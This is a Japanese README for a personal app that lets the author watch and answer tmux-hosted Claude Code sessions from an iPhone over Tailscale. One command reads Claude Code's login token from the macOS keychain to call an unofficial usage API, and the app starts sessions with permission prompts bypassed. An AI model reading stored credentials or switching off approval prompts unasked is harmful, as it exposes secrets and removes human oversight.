# つみきリモート

Mac の tmux セッション（＝Claude Code などを走らせている画面）を、
iPhone から見て・指示を返せるようにする自作アプリ。

蓋は開けたまま、画面だけ消して Mac は動かし続ける。外出先からは Tailscale 経由で届く。

```
iPhone (PWA)  ──https──▶  Tailscale  ──▶  Mac:8787 (server.js)  ──▶  tmux  ──▶  Claude Code
```

## 中身

| ファイル | 役割 |
|---|---|
| `server.js` | 依存パッケージなしの小さなHTTPサーバー。tmux にコマンドを投げるだけ |
| `public/index.html` | スマホ用の画面（単一HTML・PWA）。1.5秒ごとに状態を取りに行く。版が変わったら自分で読み込み直す |
| `hooks/ntfy-notify.sh` | Claude Code の hook から ntfy.sh に「返答待ち／終わった」を通知 |
| `launchagents/*.plist` | ログイン時に ①サーバー ②caffeinate を自動起動 |

## 題名（どれがどれか）

`work1` のような機械の名前ではどれがどれか分からないので、**ターミナルの題名
（tmux の `#{pane_title}`）を題名として使う**。Claude Code はここに「いま何をしているか」
を書き込んでいる。

```
work1 → ⠐ Obsidianで JR ビューン申し込み内容を確認
work2 → ⠐ つみきリモートの閉じるボタン機能を修正
```

- 先頭のスピナー（`⠐` などの点字）は落とす。60文字で切る
- 題名が無い＝ホスト名やパスが入っているだけ（素のシェル）なら**フォルダ名**に落とし、
  それも無ければセッション名に戻す
- 題名の置き場は**タブ**。折り返して**全文**出す（`max-width:11.5em` で横幅を止め、
  伸びるのは縦だけ）。横に伸ばすと隣のタブが画面から消えて切り替え先が見えなくなる
- 状態（待機/作業中）と種類（Claude/シェル）は**同じ行**に置く。題名が2〜3行に
  なるぶんをここで返す。iPhone 幅390pxでタブは172×69px、2枚＋次の頭が見える
- ⚠️ 題名は60文字まで。**60文字だとタブが137px**まで伸びて画面を圧迫する。
  実際の Claude Code の題名は20文字前後なので2行で収まっているが、
  長い題名が続くようなら `.tab .n` の `max-width` を広げるか行数を止める
- 一番上の「つみきリモート」はそのまま（アプリ名を残す）
- 終わらせる確認にも題名を出す（`work3` だけでは何を消すのか分からない）

## 状態の見かた

| 表示 | 判定 |
|---|---|
| **作業中** | 画面に `esc to interrupt` やスピナーがある／直近5秒で画面が動いた |
| **返答待ち** | 画面に `Do you want` `❯ 1.` `(y/n)` などの選択肢が出ている |
| **返答待ち** | 画面の下16行に「ほかの案（自由に書いてください）」「数字だけ返してください」がある |
| **中断** | 中断の**札**が立っている席（下の「札として持つ」を見る） |
| **待機** | 5秒以上なにも動いていない |

判定の順番は **返答待ち（枠） → 作業中 → 中断 → 返答待ち（番号） → 5秒ルール**。
中断が番号の質問より先なのは、質問を出したあとに止めると質問の字がまだ末尾に残っていて、
順番が逆だと「返答待ち」のまま中断の縁が出ないため。

### 中断（2026-09-03）

「あなたが手で止めて、そのまま置いてある席」。**タブの縁が青**になる（作業中＝うすい紫、
返答待ち＝オレンジ、待機＝色なし）。止めかたは2通りあり、画面に残る印もそれぞれ違う。

| 止めかた | 押すもの | 送るもの | 画面に残る印 |
|---|---|---|---|
| 動いている最中 | キー行の `pause` | esc（キー） | `⎿ Interrupted · What should Claude do instead?` |
| 番号で聞かれている最中 | キー行の `pause` | `pause`（**言葉**） | Claude が書く `⏸ 中断しました` |
| 質問パネルが出ている | キー行の `pause` | esc（キー） | パネルが閉じる |

⚠️ **番号で聞かれている場面で esc を送っても何も起きない。** Claude Code はもう入力待ちで
止まっていて、押しても画面が変わらない＝「押したのに効かない」に見える。だからここだけは
言葉で伝える。受け取った Claude が手を止めて `⏸ 中断しました` と書くことは、共通ルール
（`~/.claude/CLAUDE.md` の「質問のしかた」）で決めてある。
⚠️ **素のシェルの席には言葉を送らない**（`pause` がコマンドとして走る）。必ず esc にする。
⚠️ **枠（質問パネル・許可ダイアログ）が出ているあいだも言葉を送らない**（`liveBox()`）。
枠に文字を打ち込むと、選ぶどころか枠の中の入力欄に吸い込まれる。

**戻すのは `resume`。** 中断の席にだけ出る札で、押すと「続けて」と一言送る。
キーではなく本文を送るのは、esc で止めた席は素のプロンプトに戻っていて、
キーを送っても何も起きないため。

文言は 2026-09-03 に **Claude Code の中身を読んで確かめた**
（`{tone:"dim", text:"Interrupted", detail:"What should Claude do instead?"}` と
`[Request interrupted by user]` `[Request interrupted by user for tool use]`）。
囲みの `⎿` が必ず付くかは版によるので、**付いていなくても拾う**ようにしてある。

印は**行の頭**で見て、そのうしろも見る（`Interrupted` のあとが「 ·」か行末）。
字だけを探すと、この仕組みの話をしているだけの地の文（「画面に Interrupted などが
出ていたら…」）まで当たる。折り返しで `Interrupted` が行頭に来ても、うしろが
「などが」なら当たらない。
⚠️ `\s` は改行も食うので、行末は `[ \t]*$` で見ること（`\s*$` だと次の行まで越える）。

#### 中断は「札」として持つ（2026-09-03・2回目）

画面の字だけで決めていると、**Claude が一言でも書き足したとたん印が上へ押し出されて、
何もしていないのに中断が解ける**＝`resume` を押す前に札が消えてしまう。
だから一度立てた札は、**こちらから降ろすまで立ったまま**にする（`pausedSeat`）。

| | いつ |
|---|---|
| **立てる** | 画面に印を見つけた／`POST /api/pause {on:true}`（キー行の `pause` が押した事実で立てる） |
| **降ろす** | その席に**文字を送った**（`/api/send`＝`resume` の「続けて」も手打ちの指示も同じ）／その席が**動き出した**（スピナー・枠を出して聞いてきた） |

⚠️ **降ろしたあとも印は画面に残っている。** そのままだと次の巡回でまた立ってしまうので、
降ろすときは「**消音**」にして、印が画面から流れて消えるまで数えない。消えたら札そのものを
捨てて、次に出た印はまた数える（`pausedSeat` の値 `on` / `off`）。

⚠️ **`/api/pause` は tmux に何も送らない。** 札だけを動かす口。esc で枠を閉じただけのように
**画面に印が残らない止めかた**があるので、字を読むほかに「押した事実」でも立てられるようにしてある。
⚠️ 素のシェルの席には札を立てない（esc はほぼ何も起こさないので「中断のまま」が嘘になる）。
⚠️ 言葉で止めるとき（`pause` を送る道）は、**送れてから札を立てる**。先に立てると、
そのすぐあとの `/api/send` が降ろしてしまう。

押した直後の見た目は**手元で先に**出す（`pauseWish`）。Mac が「中断」と言ってくるまでには
巡回1〜2回ぶんの間があるため。Mac が同じことを言ったら手を引き、言ってこなければ
8秒で諦める（札が立たなかったときに嘘の縁を出しっぱなしにしない）。

使い捨ての席（架空の画面）に実際のサーバーで当てて確かめた（2026-09-03 実測）＝
①印のある画面→中断 ②5秒後も中断 ③画面に字を足しても中断 ④文字を送ると解ける
⑤`/api/pause on` で中断 ⑥`/api/pause off` で解ける。**実在の席には触っていない。**

判定に使うのは「いま見えている画面」だけ。スクロールバックを混ぜると、
一度出た `Do you want…` が永遠に残って返答待ちに見えてしまう。

**番号で答える質問も返答待ちに数える**（2026-09-01）。共通ルール
（`~/.claude/CLAUDE.md`）で、選択パネル（AskUserQuestion）は使わずに本文へ番号を
書いて数字で返してもらうと決めてある。返答待ちのほとんどはこの形なのに、
Claude Code 自身が出す選択肢の枠ではないので `WAITING_RE` にひとつも引っかからず、
**札もオレンジも通知も出ていなかった**。手がかりは `ASK_NUM_RE` の2つ＝そのルールで
必ず書くと決まっている「ほかの案（自由に書いてください）」と「数字だけ返してください」。

- **画面の下16行だけを見る**（`ASK_NUM_TAIL`）。答えたあとも字はしばらく残るので、
  画面ぜんぶを見ると「答えたのに返答待ちのまま」になる。新しいやり取りが積まれて
  上へ押し出されたら、もう待っていないと見なす
- **スピナーのほうが強い**。答えた直後は Claude が動き出すのに質問の字はまだ
  残っているので、そこは「作業中」と出す（判定の順番＝枠の選択肢 → スピナー →
  番号の質問 → 5秒ルール）

**⚠️ 「数字だけ」と「〜してください」の両方が要る**（2026-09-02 に直した）。
最初の `ASK_NUM_RE` は `(数字|番号)(だけ|のみ)?[をでは]?(返|送)し` で、質問かどうかを
まったく見ていなかった。そのせいで**当たりすぎと取りこぼしを同時に**やっていた。

- 当たりすぎ＝**ただの説明文**が返答待ちになる。「この関数はエラー番号を返します」
  「注文番号を返しました」「番号は返しません」、それに**こちらが送った頼みごとの文面**
  （`> 行番号を返してください`）まで当たる。これが画面の下16行に残っていると、
  処理が終わって静かになった席がオレンジのまま戻らない（実測：24秒たっても返答待ち）
- 取りこぼし＝肝心の共通ルールの実文面「**番号だけをチャット欄に返してください**」は、
  `[をでは]?` が助詞1字しか許さないので**当たらなかった**。緩いのに本命を拾えていない

→ いまの形は**手がかりを3本**持っている。**片方だけ直すと、もう片方が残る**
（後半を消すだけだと本命の取りこぼしが残る）。

| 手がかり | 例 | 門番 |
|---|---|---|
| ①「ほかの案（自由に書いてください）」 | そのまま | 共通ルールが必ず書くと決めている一行 |
| ②「数字**だけ**…返してください」 | 番号だけをチャット欄に返してください／数字だけ（例: 1）を返してください | **「だけ／のみ」**が門番。動詞は広く取ってよい（返して・送って・教えて・入力して・書いて…） |
| ③「番号で**お答え**ください」 | 1〜4 の数字でお答えください／番号でお知らせください | **動詞**が門番。「だけ」が無くても質問と分かる**お答え・お返事・お知らせ・答えて**だけに限る |

⚠️ **③に「返す」「送る」を入れてはいけない。** 入れた瞬間に「行番号を返してください」
「電話番号を返してください」という**ふつうの頼みごと**が全部当たる。②で拾えるのは
「だけ／のみ」が付いているからで、そこが外れると歯止めが無くなる。

⚠️ **「だけ」と動詞のあいだは10文字まで**しか離れてよいことにしていない（`。`と改行は
越えない）。離してよくすると「番号だけを見て、あとで直してください」のような別の文まで
つながって当たる。

⚠️ **端末は桁で折り返すので、長い文の途中に本物の改行が入る。**
「…あああああ番号<改行>だけをチャット欄に返してください。」のように**単語の途中で割れる**
ので、そのままだと当たらない（実測：前置きの長さを1字ずつずらすと40通り中24通りで落ちた）。
→ **空白と改行を取り払った文字列でも試す**（`asksNumber`）。

⚠️ **引用やメタ言及は原理的に落とせない。** 「ユーザーには『番号だけ返してください』と
伝えています」「`CLAUDE.md` に…と書いてある」は当たる。文面だけで「いま聞いているのか、
話題にしているだけか」は見分けられない。**この機能自体を触っている席**が誤ってオレンジに
なるのはそのため。影響は札の色と「⚠️ うち◯件は返答待ち」の数だけ。

⚠️ **英語で聞かれたら拾えない**（`Reply with the number only`）。手がかりは日本語だけ。
⚠️ **ルールの文面を変えるときは、ここも一緒に見ること。**

**⚠️ 幅を変えたときの画面の変化は「動いた」に数えない**（2026-09-01）。
枠線も折り返しも引き直されるので、リサイズすると画面の文字が丸ごと変わる。
これを「直近5秒で画面が動いた」と読むと、幅が変わるたびに**作業中に戻る**。
桁数を送るのは「いま選んでいる席」だけなので、**選んでいる席だけ**が巻き添えになった：

- iPhone(51桁) と iPad(101桁) で同じ席を開くと、1.5秒ごとに幅が往復し、
  その席は**永久に作業中**。札も戻らず、`作業中以外を終わらせる` でも片付かない
  （サーバーの `/api/killmany` も作業中は残すため）。実際は Claude は止まっている
- 1台でも、絵つきの質問で 120桁に広げて戻すたびに数秒つかまる

→ `resizeWindow()` がリサイズした時刻を覚え、そこから `RESIZE_GRACE_MS`（2秒）の
あいだの変化は静かさ（`quietMs`）の計算に入れない（画面の中身だけ入れ替えて、
「いつ動いたか」は据え置く）。本当に動いているものは `esc to interrupt` と
スピナーが拾うので、見落としにはならない。

## 文字を送る（消えないようにするための仕掛け）

送信は `/api/send`。**改行があるかどうかで道が2つに分かれる。**

| 本文 | 通る道 |
|---|---|
| 改行あり／8KB超の1行 | `load-buffer`（標準入力）→ `paste-buffer -p`（角括弧ペースト） |
| 8KB以下の1行 | `send-keys -t 席 -l -- 本文` |

⚠️ **tmux は argv を「コマンドの並び」として読み直す**ので、本文をそのまま最後の引数に
置くと3か所で壊れる。3つとも 2026-09-02 に直した（tmux 3.7b で実測）。

- **末尾のセミコロンを剥がす。** `color: red;` → 届くのは `color: red`。本文が `;` 1文字
  だけなら引数ごと消えて Enter しか飛ばない。**それまで100%欠けていた。**
  → 末尾だけ二重エスケープ（`abc;` → `abc\;` → 届くのは `abc;`）。
  すでに `\;` で終わる本文も同じ足し方で正しく届く。途中の `;` は無傷なので触らない
- **先頭が `-` の本文を旗（オプション）と読む。** 「-y をつけて」は `unknown flag -y` で
  500 になり、送信そのものが失敗していた → 引数の終わり印 `--` を `-l` の直後に置く。
  `/api/key` のキー名も同じ穴があったので、そちらにも `--` を入れてある
- **1回に渡せる本文には上限がある。** 改行を含まない本文は **約16.3KB** で
  `command too long` になる（16,000B は通る／16,400B から落ちる）。上限を上げても
  ここは通らないので、**8KB超の1行は load-buffer に回す**（実測 500KB でも欠けずに届く）

⚠️ **本文の上限は 8MB**（`SEND_LIMIT`）。それまでは `readBody` の既定 64KB のままで、
日本語なら約21,800字で切れていた。しかも上限を超えると**返事を書く前にソケットを壊して
いた**ので、画面には 413 ではなく「MacBook に届きません」と出た＝**電波のせいに見える**
のが最悪だった。いまは読むのをやめて 413 と日本語の理由を返す。

⚠️ **送信に失敗したら、入力欄の書きかけを戻す。** 押した手応えのために入力欄は先に空に
するが、失敗したら書き戻し、**理由をトーストに残す**（「送信できませんでした（本文が
大きすぎます…）」）。トーストは1枠しかないので、理由を混ぜないと読めない。
打っている途中に失敗が返ってきたときは、いま打っている字を消さない（そのときは
「戻しました」とも言わない）。

⚠️ **「MacBook に届きません」の帯が出ているあいだは送信ボタンを押せない。**
以前は押せてしまい、押した瞬間に長文が消えていた。押せるかどうかの判断は
`syncSendEnabled()` 1か所に集めてある。**ただし「画面（/api/pane）だけ失敗」では止めない**
（Mac には届いているので、止めるのも帯を出すのも言い過ぎになる）。

## Claude の残量（ヘッダーの細い棒2本）

題名の右、接続の緑の点のとなりに出る。**上が5時間枠、下が週枠**。電池と同じで
使うほど短くなり、残り30%で橙、10%で赤。**押すと残り％とリセット時刻**が出る。

- 取得元は Claude Code の `/usage` と同じ口（`https://api.anthropic.com/api/oauth/usage`）。
  ログイン情報はキーチェーン（`security find-generic-password -s "Claude Code-credentials"`）
  から**読むだけ**。書き戻すと Claude Code 側のログインを壊しかねないので、
  期限切れ（401）でも自前で更新はしない。
- **⚠️ この口は公開仕様ではない。** 形が変わったら取れなくなるので、
  取れなかったら**黙って棒ごと消える**（アプリの他の機能は普通に動く）。
- スマホは1.5秒ごとに状態を聞きに来るので、**サーバー側でためて** `/api/state`
  に相乗りさせる。そのまま外へ投げると叩きすぎで弾かれる。
  一時的に取れなかったときは60分だけ前の値を出し続ける（点滅を防ぐ）。
- ⚠️ **取り直しは5分おき。429 が返ったら `retry-after` を必ず守る**（2026-08-31 に直した）。
  それまでは60秒おきに叩き、失敗しても同じ間隔で叩き直していた。
  キーチェーンのトークンが切れて 401 が数回出たあと 429 に変わり、待たずに叩き続けたせいで
  **2243回連続の429＝37時間、棒が消えたまま**になった（自力では戻らない）。
  401 や通信エラーも 5→10→20…最大60分と倍々で待つ。
- 数字は普段出さない。**残り20%を切ったときだけ**、少ない方の数字が棒の横に出る。
- **取れていないときは、空の棒＋横に `?` を出したまま**にする（薄さは80%。40%は
  薄すぎて気づけなかった・本人指摘）。`?` があることで「残り0%」とも
  「メニューの三本線」とも読み違えない。押すと理由と
  「あと◯分で取り直します」がトーストで出る（2026-08-31 に追加）。
  以前は黙って消えていたので、37時間壊れていたことに誰も気づけなかった。
  ただし**届いていないあいだ（オフライン）は出さない**（今の話ではないため・電池と同じ扱い）。
  サーバーは `/api/state` に `usageWait:{status,retryInSec}` を添えて理由を渡す。

## セットアップ

### 1. 常駐（済）

```bash
launchctl list | grep tsumiki
```

`com.tsumiki.remote`（サーバー）と `com.tsumiki.awake`（caffeinate）が出れば動いている。

止めたいとき:

```bash
launchctl unload ~/Library/LaunchAgents/com.tsumiki.awake.plist
```

### 2. 画面だけ消す

**Control + Shift + 電源ボタンは Touch ID 搭載機では効かない。** 電源ボタンが
Touch ID センサーになっていて、修飾キーの組み合わせとして認識されないため。
代わりに次のどれかを使う。

| 手段 | やりかた |
|---|---|
| 専用アプリ | `~/Applications/画面を消す.app`（Dock に置いて1クリック） |
| アプリから | つみきリモートのヘッダーの **消灯**（外出先からでも消せる） |
| コマンド | `pmset displaysleepnow` |
| ホットコーナー | システム設定 → デスクトップとDock → ホットコーナー → 隅に「ディスプレイをスリープさせる」 |

`caffeinate -ims` を常駐させてあるので、画面が消えても Mac は眠らない。
（`-d` を付けていないので「画面は消える」。付けると画面も点いたままになる）

**⚠️ Amphetamine と喧嘩する。** Amphetamine が「ディスプレイも起こしておく」
セッションを持っていると、何で消しても画面がすぐ復帰する。今回の目的
（蓋は開けたまま画面だけ消す）とは真逆なので、そのセッションは終了しておく。
眠らせない役目は `com.tsumiki.awake` が担っているので Amphetamine は不要。

### 3. Tailscale（外から繋ぐ）— sudo なしで動かす

公式の案内は `sudo brew services start tailscale` だが、それだと管理者権限が要る。
**userspace-networking モード**なら一般ユーザー権限のまま動く。

```bash
launchctl load ~/Library/LaunchAgents/com.tsumiki.tailscaled.plist
```

このモードでは OS のネットワーク層に入らない代わりに、
**外から入ってきた接続は localhost の同じポートへ転送される**。
今回欲しいのは「iPhone → Mac:8787」の向きだけなので、これで足りる。

CLI は毎回ソケットの指定が要る（普段の `tailscale` コマンドとは別物になる）:

```bash
alias ts='tailscale --socket=$HOME/.tsumiki-remote/tailscaled.sock'
ts status
ts ip -4
```

ログインは `ts up` が出す URL をブラウザで開いて認証する。

サーバーは `127.0.0.1` にしか口を開けていないので、Tailscale を通した以外の経路では
一切届かない（ルーターのポート開放も不要）。

`https://…ts.net/` の名前で開きたい場合だけ、管理画面で HTTPS を有効にしたうえで
`ts serve --bg 8787`。名前が要らなければ `http://<tailscale IP>:8787` で足りる。

### 4. iPhone 側

1. App Store で **Tailscale** を入れて同じアカウントでログイン、VPN を常時ONにする
2. `./bin/qr.sh` が出す QR を iPhone のカメラで読む（URL にトークンが入っている）

   - 手打ちするなら `http://<tailscale IP>:8787/?t=<トークン>`（`cat ~/.tsumiki-remote/token`）

3. 共有 → **ホーム画面に追加**。以後アイコンから全画面で起動する

### 5. 通知（ntfy）

1. App Store で **ntfy** を入れる
2. トピックを購読: `cat ~/.tsumiki-remote/ntfy-topic`
3. Claude Code が**こちらの返事で止まったとき**に通知が来る

鳴るのは `PermissionRequest` と `Notification` の2つだけ。
`Stop`（1ターンの応答完了）にも付けていたが、**返答のたびに鳴って実用にならない**ので外した。

#### 何を待たれているのかを、通知の見出しで見分ける（2026-08-24）

| 見出し | いつ | 強さ |
|---|---|---|
| **質問が来ています** | Claude が「どれにしますか？」と選択肢を出した（`AskUserQuestion`） | 高（鳴る） |
| **許可を待っています** | ツールを使ってよいかの確認 | 高（鳴る） |
| 入力待ち | 1ターンの区切り。ただ待っているだけ | 並（静か） |

**質問とツールの許可は、どちらも `PermissionRequest` として飛んでくる。**
そのままだと質問まで「許可を待っています」と出て、何を待たれているのか分からなかった。
hook が標準入力でくれる JSON に道具の名前（`AskUserQuestion`）が入っているので、そこで見分ける。

**「入力待ち」を並の強さに落とした。** 実測（2026-08-24）で3時間に20通以上飛んでおり、
全部が同じ強さで鳴ると**肝心の「質問が来ています」が埋もれる**。ここを静かにして、
本当に返事が要る2つだけが鳴るようにした。元に戻すなら `hooks/ntfy-notify.sh` の
`notification` の `PRIORITY` を `high` に。

#### 長くかかった作業の終わりだけ鳴らす（2026-08-24・2回目）

**11.4時間ぶんの ntfy 履歴を数えたら 38通中26通（68%）が「入力待ち」だった。**
3秒で返ってきた相づちも、30分回した作業の完了も、同じ静かな「入力待ち」で届いていた。
**外出先でいちばん知りたいのは「頼んで放っておいたものが終わった」ほう**なので、そこだけ鳴らす。

| 待たされた時間 | 見出し | 強さ |
|---|---|---|
| **5分以上**（`LONG_RUN`） | **終わりました（◯分）** | 高（鳴る） |
| 5分未満 | 入力待ち | 並（静か） |

- 「いつ頼まれたか」は `UserPromptSubmit` の hook（`ntfy-notify.sh start`）が
  `~/.tsumiki-remote/notify-state/<セッション名>.start` に時刻を書くだけ。**通知は送らない。**
- ターンが終わったら差を取って、畳む（ファイルを消す）。
- ⚠️ **この記録が無くても動く**＝そのときは今までどおり全部「入力待ち」で静か。
  hook を外す・消す・初回、どれでも壊れない。
- 境目を変えるなら `hooks/ntfy-notify.sh` の `LONG_RUN`（秒）。まるごと戻すなら
  `~/.claude/settings.json` の `UserPromptSubmit` から `ntfy-notify.sh start` の行を消す。

⚠️ **`Stop` は hook に登録していない**（実データで確認：11.4時間で0通＝死んだ枝だった）。
ターンの終わりは `Notification` が既に飛ばしているので、両方登録すると1回の用事で2回鳴る。
スクリプトに `stop` の枝が残っているのは、手で叩いて試すとき用。

`PermissionRequest` と `Notification` の両方を撃つので、放っておくと約6秒後に
同じ用事で2回鳴る。**同じセッションは20秒に1通まで**にして、先に来た具体的な方だけ残す。

**ただし大事な方は追い越せる**（2026-08-24）。ターン終わりの「入力待ち」の直後に
質問が出ると、20秒の制限で**質問の通知が消えてしまう**。記録に「大事さ」
（質問3 > 許可2・終わりました2 > 入力待ち1）を持たせ、より大事なものは20秒以内でも通す。
記録は `~/.tsumiki-remote/notify-state/<セッション名>` に `時刻|大事さ` の形で置くだけ（消しても害はない）。

送っているのは **見出しと、そのセッションの題名だけ**。
題名＝一覧に出ているのと同じ「いま何をしているか」の一行（例: つみきリモートの画像通知機能の変更）。
`work5` では何の用事か分からないので 2026-08-11 に切り替えた。題名が取れないときは
フォルダ名 → セッション名の順に落ちる。**質問の中身・選択肢・会話・ファイル名・コマンドは外に出さない。**

⚠️ 題名は Claude Code が作業内容から書いているので、**用件が ntfy.sh（外部サーバー）に残る**。
それが嫌なら `hooks/ntfy-notify.sh` の `USE_TITLE=1` を `0` にすると元の `work5` 表示に戻る。

⚠️ **通知をタップしてつみきリモートを開く仕掛けは、あえて付けていない。**
ntfy の `Click:` に URL を入れれば飛べるが、iPhone はホーム画面のアプリと Safari で
保存領域が別なので、トークン無しの URL では合言葉を聞かれて終わる。トークン入りの URL を
置けば飛べる代わりに、**tmux を操作できる合言葉が ntfy.sh（外部）に残る**。
通知が来たらホーム画面のアイコンから開く、を今のところ正とする。

## ＋Claude の起動オプション

このアプリから作るセッションは **編集をバイパス**（`--permission-mode bypassPermissions`）で
起動する。スマホから「これ実行していい？」に毎回答えるのは現実的でないため。

**副作用**：許可を求めて止まらなくなるので、**返答待ちの通知はほとんど飛ばなくなる**。
通知が来るのは、Claude が選択肢つきで質問してきたときだけになる。

初回だけ「Bypass Permissions mode を受け入れますか」の確認が出る。`2` を選べば以後は出ない。

普通の権限確認つきに戻したいときは、LaunchAgent に環境変数を足す:

```
TSUMIKI_CLAUDE_CMD=claude
```

### どのモデルで始めるか

＋Claude を押すと「どのモデルで始める？」が出る（Opus・Fable・Sonnet・Haiku）。
選んだものは起動時の `--model` に渡る。**その席だけに効き、Mac 側の既定は変わらない**
（動いている席に `/model` を打つやり方だと既定まで書き換わるので、そちらは採らない）。
前回選んだものには「前回」の印が付く（説明文は置かない＝名前だけ並べる）。

選んだモデルは、**そのセッションに tmux の印（`@tsumiki_model`）として書いておく**。
一覧の札では、種類の札（Claude）の代わりにモデル名を出す＝
「Claude」と「Opus」を並べない（札が狭いのと、緑＝Claude は色と場所で分かるため）。
入力欄の上の送り先にも、題名の右に同じ札を出す。

**色は Anthropic 本家の色をそのまま借りる**（anthropic.com の CSS 変数 `--swatch--*`）。

| モデル | 色 | 本家での名前 |
|---|---|---|
| Opus | `#d97757` | clay（Claude 本体の色） |
| Fable | `#c46686` | fig |
| Sonnet | `#6a9bcc` | sky |
| Haiku | `#bcd1ca` | cactus |

文字はその色のまま、下地は同じ色を黒に沈めたもの（黒地との明暗比 4.8〜9.6）。
選ぶ画面では、名前の前に同じ色の丸い印を出す（名前そのものを色にすると
「（前回）」の緑とぶつかるため）。

- 印は席と一緒に消えるので後始末が要らず、サーバーを入れ替えても残る。
- **⚠️ 覚えているのは「始めたときに選んだもの」だけ。** あとから中で `/model` を打って
  変えても追いかけられない（外から見る手がかりが無い）。
- アプリの外で作った席・モデルを選ばずに作った席は印が無いので、今まで通り「Claude」と出る。

## 画面の塗り分け

行頭の記号で「誰の言葉か」を判定して、かたまりごとに薄く色を敷く。

| 対象 | 手がかり | 見た目 |
|---|---|---|
| Claude の返答 | `⏺ ふつうの文` | 緑をごく薄く＋左に緑の線 |

## 桁合わせ（枠が崩れないようにする仕組み）

ターミナルは「半角が何個ぶん」で桁を合わせて絵を描く。スマホでそのまま出すと必ず崩れる。
理由は2つあって、**どちらも別々に手当てしている**（2026-08-13）。

**① 幅が足りない。** tmux は誰も繋いでいないと 80桁×24行で作られる。スマホに入るのは
実測で 47〜55桁しかないので、80桁の絵は必ず途中で折り返し、罫線が散らばる。
→ 画面側が「この端末に何桁入るか」を実測して `/api/pane?cols=NN` で送り、
サーバーが `tmux resize-window` でその幅に合わせる（高さは 45 行に固定。端末が短いと
Claude Code 自身が中身を畳んで「✂ 7 lines hidden」にしてしまい、スマホに届かなくなるため）。
`resize-window` はその窓を `window-size manual` にするので、直後に `latest` へ戻している
（戻さないと、MacBook のターミナルから繋いだときも細いままになる）。
⚠️ このリサイズは画面の文字を丸ごと変えるので、状態の判定を巻き込む
→「状態の見かた」の `RESIZE_GRACE_MS`。

**② 日本語の幅が「半角2つぶん」ぴったりではない。** SF Mono（`ui-monospace`）の半角は
0.618em だが日本語の字が無く、ヒラギノにこぼれて 1.000em で出る。端末が想定する
1.236em より狭いので、**全角1文字ごとに 0.38桁ぶん左にズレる**（日本語15文字で約5.7桁）。
幅を合わせてもこのズレは消えないので、**枠は読み取って捨て、中身を組み直す**。

2026-08-16 に実測した内訳（10.5px・`--mono`）。**ズレるのは全角の字だけ**で、罫線とブロックは
端末とぴったり合う。だから絵として出すところ（`.draw`）では**全角の字だけ幅2桁の箱に入れて**
桁をそろえている。

| 字 | ブラウザでの幅 | 端末の数え方 |
|---|---|---|
| `0` `a` 半角 | 1.000ch | 1桁 ✅ |
| `─ │ ┌ ┼` 罫線 | 1.000ch | 1桁 ✅ |
| `█ ▓` ブロック | 1.000ch | 1桁 ✅ |
| `需` `月` `・` 全角 | 1.618ch | 2桁 ❌ |
| `（` 全角カッコ | 0.849ch | 2桁 ❌ |

⚠️ `<pre>` には**必ず `font-family` を書く**。ブラウザ既定の generic な monospace を
`<pre>` 自身が持っていて、親からの継承より強い。書き忘れると等幅ですらないフォントに落ち、
空白と罫線の幅が倍ちがって格子がまるごと崩れる（`.draw` で実際に起きていた）。

| 端末が描いたもの | 画面での出しかた |
|---|---|
| `┌─┬┐` の表 | 本物の `<table>` に組み直す（桁合わせはブラウザに任せる） |
| `╭─╮` の選択ダイアログ | 枠を捨て、文章・選択肢・説明文に組み直す。**選択肢はそのまま押せる**（押す＝クイックキーの 1〜5 と同じ） |
| その中に入った罫線（差分など） | 折り返さず横スクロール。桁が崩れると意味が変わるため |
| 選択肢＋プレビューの2段組 | 桁で左右に切り分け、左＝押せる選択肢／右＝プレビュー（別枠・横スクロール） |

**2段組について（2026-08-16）。** Claude Code の質問は、選択肢に「プレビュー」が付くと
横並びの2段組になる。角丸の箱（`╭─╮`）ではないので、上の組み直しが拾えず生のまま出ていた。

```
❯ 1. 週単位                  ┌───────────────┐
  2. 月単位                  │ 週            │
  3. 日付（暦日）            │ W1  W2  W3    │
```

1行の中に「左＝選択肢／右＝絵」が同居するので、そのまま出すと
①選択肢が押せない（右の罫線が混ざって「1.」の行として読めない）
②右の絵が29桁ぶん字下げされたまま流れて画面の大半が空白
③`│` で始まる行を「返答待ち」と見なす塗り分けが後ろの字下げ行・空行まで連れて行き、
画面いっぱいがオレンジのベタ塗りになる。切り分ける桁は**全角＝2桁で数える**
（文字数で切ると、左に日本語が入っているぶんだけズレて右の箱を切り損ねる）。

**絵が壊れるのは受け取る前**。プレビュー付きの質問は端末の幅を左右で山分けするので、
スマホに合わせた51桁だと絵の側が15桁しか無く、45桁で描かれた図は Claude Code の中で
折り返されて壊れてから tmux に届く。受け取ってから直す方法は無い。

→ **その質問が出ている間だけ、端末を120桁借りる**（`WIDE_COLS`）。実測（2026-08-16）で
絵の側が44桁とれて図はそのまま届き、その44桁はスマホの51桁に収まる＝横スクロールも要らない。
答えた瞬間に実測の幅へ戻る。引き換えに、その間だけ質問の上の文章が120桁で折り返されて届き、
画面側でもう一度折り返されて少し不格好になる。`─` が並んだだけの区切り線は
画面側で1本の線に描き直しているので、そこは崩れない。

組み直しで難しいのは「その行は前の行が折り返しただけか／別の行か」の見分け。手がかりは
①前の行が枠いっぱいまで届いていたら折り返し ②選択肢より深い字下げならその選択肢の説明文。
**迷ったらつながない**（行が分かれて少し不格好、で済ませる。誤ってつなぐと文が壊れる）。
押せるのは一番下の枠だけ。遡って読んでいるつもりが、いまの質問に答えてしまう事故を防ぐ。

### URL は繋ぎ直して「コピー」の札を付ける（2026-08-24）

同じ「桁でぶつ切り」の被害が URL にも出る。長い公開URLは幅に入りきらず途中で割られるので、
**なぞってコピーすると切れ目に改行が入り、そのままでは開けないURLになる**（実害はここ）。

- 繋ぎ直す条件（`joinUrlWraps`）＝①その行が桁いっぱいまで届いている（端末が長い単語を割ると
  必ず幅ぴったりになる＝「割られた」印）②行末が URL の途中 ③次の行の頭が URL に使える字。
  3つ揃ったときだけ繋ぐ。`⏺ ⎿ ❯` や罫線で始まる行は③で弾かれるので、ダイアログ・表は無傷。
- 繋いだ URL はリンクに描き直し、横に **写す札**（`.lcp`）を置く。札は字ではなく絵（紙が2枚重なった印）で、
  写すと**チェックに変わって緑になる**（2秒で戻る）。見た目は20px角のままで、**指の当たり判定だけ
  `::after` で外へ広げてある**（見た目を大きくすると等幅の行がガタつくため）。
- **写す道は2つ、必ず両方やる**（2026-08-24 に「押しても何も写らない」で作り直した）。
  iPhone は開き方で通る道が変わり、片方に賭けると黙って空振りする。
  ① `navigator.clipboard`＝https のときだけ使える正式な口。ホーム画面から起動したPWAでは
  空振りすることがある。② 見えない入力欄を選んで `execCommand('copy')`＝http でも通る昔ながらの道。
